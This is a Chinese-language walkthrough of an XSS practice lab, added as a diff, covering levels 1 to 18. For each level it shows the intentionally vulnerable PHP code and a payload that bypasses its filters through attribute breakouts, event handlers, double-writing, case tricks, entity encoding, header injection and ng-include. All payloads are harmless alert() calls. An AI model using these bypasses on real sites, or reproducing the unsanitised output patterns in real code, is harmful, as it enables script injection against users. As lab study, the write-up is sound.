@@ -1,0 +1,376 @@
+### level 1
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["name"];  
+echo "<h2 align=center>欢迎用户".$str."</h2>";  
+?>
+```
+get传参，直接拼接在h2标签中并没有做任何处理直接凭借JavaScript代码即可
+**payload**
+~~~php
+?name=<script>alert('1')</script>
+~~~
+### level 2
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form action=level2.php method=GET>  
+<input name=keyword  value="'.$str.'">  
+<input type=submit name=submit value="搜索"/>  
+</form>  
+</center>';  
+?>
+```
+#### 函数注解
+`htmlspecialchars()` 是 PHP 中一个非常重要的安全函数，用于将特殊字符转换为 HTML 实体，防止 XSS(跨站脚本)攻击。
+- 基础语法
+```php
+htmlspecialchars( 
+	string $string,
+	int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,
+	?string $encoding = null,
+	bool $double_encode = true
+	): string
+```
+-  **主要功能**
+1. 字符转换：
+    - `&` 转换为 `&amp;`
+    - `"` 转换为 `&quot;` (当 ENT_NOQUOTES 未设置时)
+    - `'` 转换为 `&#039;` (仅当 ENT_QUOTES 设置时)
+    - `<` 转换为 `&lt;`
+    - `>` 转换为 `&gt;`
+2. 参数说明：
+    - `$string`: 要转换的字符串
+    - `$flags`: 控制函数行为的位掩码
+    - `$encoding`: 定义转换使用的字符集
+    - `$double_encode`: 是否编码已存在的 HTML 实体
+3. 常用标志(flags)
+	- `ENT_COMPAT`: 只转换双引号
+	- `ENT_QUOTES`: 转换双引号和单引号
+	- `ENT_NOQUOTES`: 不转换任何引号
+	- `ENT_HTML401`: 作为 HTML 4.01 处理代码
+	- `ENT_XML1`: 作为 XML 1 处理代码
+	- `ENT_XHTML`: 作为 XHTML 处理代码
+	- `ENT_HTML5`: 作为 HTML 5 处理代码
+**pyaload**
+`"><script>alert('1')</script><"`
+
+**疑问
+```
+<input name=keyword value="'.$str.'">中有''
+但是我输入"> <script>alert()</script> <"并没有闭合''
+检测前端源码为<input name=keyword value=""><script>alert()</script><"">触发了alert。
+我不理解我没有闭合''为什么成功了，而且为什么前端中没有了''
+```
+解答
+- 浏览器DOM解析时会将 `value="' '"` 标准化为 `value=" "`
+- 浏览器DOM解析时会将 `value='" "'` 标准化为 `value=' '
+### level 3
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>  
+<form action=level3.php method=GET>  
+<input name=keyword  value='".htmlspecialchars($str)."'>    <input type=submit name=submit value=搜索 /></form>  
+</center>";  
+?>
+```
+**payload**
+传入的参数被实体化了，所以建议使用JavaScript伪代码
+onfocus事件：
+	当输入字段获得焦点时触发JavaScript代码
+`' onfocus=javascript:alert() '`
+### level 4
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+$str2=str_replace(">","",$str);  
+$str3=str_replace("<","",$str2);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form action=level4.php method=GET>  
+<input name=keyword  value="'.$str3.'">  
+<input type=submit name=submit value=搜索 /></form>  
+</center>';  
+?>
+```
+过滤了<>标签
+**payload**
+` " onclick=javascript:alert(1) " `
+` " onfocus=javascript:alert(1) " `
+### level 5
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = strtolower($_GET["keyword"]);  
+$str2=str_replace("<script","<scr_ipt",$str);  
+$str3=str_replace("on","o_n",$str2);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form action=level5.php method=GET>  
+<input name=keyword  value="'.$str3.'">  
+<input type=submit name=submit value=搜索 /></form>  
+</center>';  
+?>
+```
+过滤了`<script>与on`
+**payload**
+a标签href属性绕过：href属性的意思是 当标签`<a>`被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码
+` "> <a href=javascript:alert()>xss注入</a> <" `
+### level 6
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+$str2=str_replace("<script","<scr_ipt",$str);  
+$str3=str_replace("on","o_n",$str2);  
+$str4=str_replace("src","sr_c",$str3);  
+$str5=str_replace("data","da_ta",$str4);  
+$str6=str_replace("href","hr_ef",$str5);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form action=level6.php method=GET>  
+<input name=keyword  value="'.$str6.'">  
+<input type=submit name=submit value=搜索 /></form>  
+</center>';  
+?>
+```
+双引号闭合并且过滤一些常见属性
+**payload**
+没有将输入转化为小写，可以尝试大小写绕过
+` " OncliCk=JavaScript:alert(1) " `
+### level 7
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str =strtolower( $_GET["keyword"]);  
+$str2=str_replace("script","",$str);  
+$str3=str_replace("on","",$str2);  
+$str4=str_replace("src","",$str3);  
+$str5=str_replace("data","",$str4);  
+$str6=str_replace("href","",$str5);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form action=level7.php method=GET>  
+<input name=keyword  value="'.$str6.'">  
+<input type=submit name=submit value=搜索 /></form>  
+</center>';  
+?>
+```
+**payload**
+双写绕过
+` " oonnclick=javascscriptript:alert(1) " `
+onerror绕过
+	onerror事件是指当图片加载不出来的时候触发js函数，以下面的代码为例，这里因为src指向的是值666，而不是图片的地址和base64编码啥的，就会导致触发alert函数。
+` "> <img srsrcc='666' oonnerror=alert()>xss<" `
+### level 8
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = strtolower($_GET["keyword"]);  
+$str2=str_replace("script","scr_ipt",$str);  
+$str3=str_replace("on","o_n",$str2);  
+$str4=str_replace("src","sr_c",$str3);  
+$str5=str_replace("data","da_ta",$str4);  
+$str6=str_replace("href","hr_ef",$str5);  
+$str7=str_replace('"','&quot',$str6);  
+echo '<center>  
+<form action=level8.php method=GET>  
+<input name=keyword  value="'.htmlspecialchars($str).'">  
+<input type=submit name=submit value=添加友情链接 /></form>  
+</center>';  
+?>
+<?php  
+ echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';  
+?>
+```
+**paylaod**
+	href属性：自动Unicode解码。
+	对`javascript:alert()`进行Unicode编码`   &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
+### level 9
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = strtolower($_GET["keyword"]);  
+$str2=str_replace("script","scr_ipt",$str);  
+$str3=str_replace("on","o_n",$str2);  
+$str4=str_replace("src","sr_c",$str3);  
+$str5=str_replace("data","da_ta",$str4);  
+$str6=str_replace("href","hr_ef",$str5);  
+$str7=str_replace('"','&quot',$str6);  
+echo '<center>  
+<form action=level9.php method=GET>  
+<input name=keyword  value="'.htmlspecialchars($str).'">  
+<input type=submit name=submit value=添加友情链接 /></form>  
+</center>';  
+?>  
+<?php  
+if(false===strpos($str7,'http://'))  
+{  
+  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';  
+        }  
+else  
+{  
+  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';  
+}  
+?>
+```
+**payload**
+- strpos():与indexof函数类似，在指定字符串中寻找目标字符，若找到返回目标字符索引若没有找到则返回-1。
+` javascript:alert() /* http:// */`
+
+对JavaScript伪代码进行Unicode进行编码，后面的` /* http:// */`进行保留用于绕过if语句`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41; /* http:// */ `
+### level 10
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+$str11 = $_GET["t_sort"];  
+$str22=str_replace(">","",$str11);  
+$str33=str_replace("<","",$str22);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form id=search>  
+<input name="t_link"  value="'.'" type="hidden">  
+<input name="t_history"  value="'.'" type="hidden">  
+<input name="t_sort"  value="'.$str33.'" type="hidden">  
+</form>  
+</center>';  
+?>
+```
+**payload**
+	`<input name="t_sort"  value="'.$str33.'" type="hidden"> `由于type被hidden了，因此无法触发事件例如onfocus
+	`?t_sort=" onfocus=javascript:alert() type="text`
+	所以此处需要创造一个type=text才能触发事件
+	`?keyword=well&t_sort=" onfocus=javascript:alert() type="text`
+### level 11
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+$str00 = $_GET["t_sort"];  
+$str11=$_SERVER['HTTP_REFERER'];  
+$str22=str_replace(">","",$str11);  
+$str33=str_replace("<","",$str22);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form id=search>  
+<input name="t_link"  value="'.'" type="hidden">  
+<input name="t_history"  value="'.'" type="hidden">  
+<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">  
+<input name="t_ref"  value="'.$str33.'" type="hidden">  
+</form>  
+</center>';  
+?>
+```
+**payload**
+	Referer注入：`Referer: " onfocus=javascript:alert() type="text`
+### level 12
+```php
+<?php ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+$str00 = $_GET["t_sort"];  
+$str11=$_SERVER['HTTP_USER_AGENT'];  
+$str22=str_replace(">","",$str11);  
+$str33=str_replace("<","",$str22);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form id=search>  
+<input name="t_link"  value="'.'" type="hidden">  
+<input name="t_history"  value="'.'" type="hidden">  
+<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">  
+<input name="t_ua"  value="'.$str33.'" type="hidden">  
+</form>  
+</center>';  
+?>
+```
+**payload**
+	User-Agent注入：` User-Agent: " onfocus=javascript:alert() type="text `
+### level 13
+源码
+```php
+<?php setcookie("user", "call me maybe?", time()+3600);  
+ini_set("display_errors", 0);  
+$str = $_GET["keyword"];  
+$str00 = $_GET["t_sort"];  
+$str11=$_COOKIE["user"];  
+$str22=str_replace(">","",$str11);  
+$str33=str_replace("<","",$str22);  
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>  
+<form id=search>  
+<input name="t_link"  value="'.'" type="hidden">  
+<input name="t_history"  value="'.'" type="hidden">  
+<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">  
+<input name="t_cook"  value="'.$str33.'" type="hidden">  
+</form>  
+</center>';  
+?>
+```
+**payload**
+	Cookie注入：` Cookie: user= " onfocus=javascript:alert() type="text `
+### level 15
+源码
+```php
+<html ng-app>  
+<head>  
+        <meta charset="utf-8">  
+        <script src="angular.min.js"></script>  
+<script>  
+window.alert = function()    
+{       
+confirm("完成的不错！");  
+ window.location.href="level16.php?keyword=test";   
+}  
+</script>  
+<title>欢迎来到level15</title>  
+</head>  
+<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>  
+<p align=center><img src=level15.png></p>  
+<?php ini_set("display_errors", 0);  
+$str = $_GET["src"];  
+echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';  
+?>
+```
+**payload**
+	ng-include:这是类似文件包含的东西，我们可以通过引用外部(本域,同源策略)html中存在问题的文件，执行xss漏洞。
+这里就包含第一关把：
+	` ?src='level1.php' `：这里就包含了level1.php如图![](./img/Pasted%20image%2020250803160921.png)
+	level1.php中存在xss漏洞，并且level1.php需要上传参数?name
+			总体过滤
+				十五关使用了`echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';`单引号闭合
+				第一关没有过滤，因此只需绕过十五关即可
+					` ?src='level1.php?name=<img src=666 onerror=alert(1)>' `
+### level 16
+源码
+```php
+<?php ini_set("display_errors", 0);  
+$str = strtolower($_GET["keyword"]);  
+$str2=str_replace("script","&nbsp;",$str);  
+$str3=str_replace(" ","&nbsp;",$str2);  
+$str4=str_replace("/","&nbsp;",$str3);  
+$str5=str_replace(" ","&nbsp;",$str4);  
+echo "<center>".$str5."</center>";  
+?>
+```
+**payload**
+%0a是回车的url编码用来替代空格，并且使用不含/的标签例如<img>
+` ?keyword=<img%0asrc=666%0aonerror=alert()> `
+### lecel 17(本关往后是关于flash插件的题目，但这个插件目前已经停用参考意义不大。)
+源码
+```php
+<?php  
+ini_set("display_errors", 0);  
+echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";  
+?>
+```
+**payload**
+`?arg01=1&arg02= onclick=alert()`
+### level 18
+源码
+```php
+<?php  
+ini_set("display_errors", 0);  
+echo "<embed src=index.png?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";  
+?>
+```
+和上一关一样没什么变化貌似
+### level 19
+### level 20
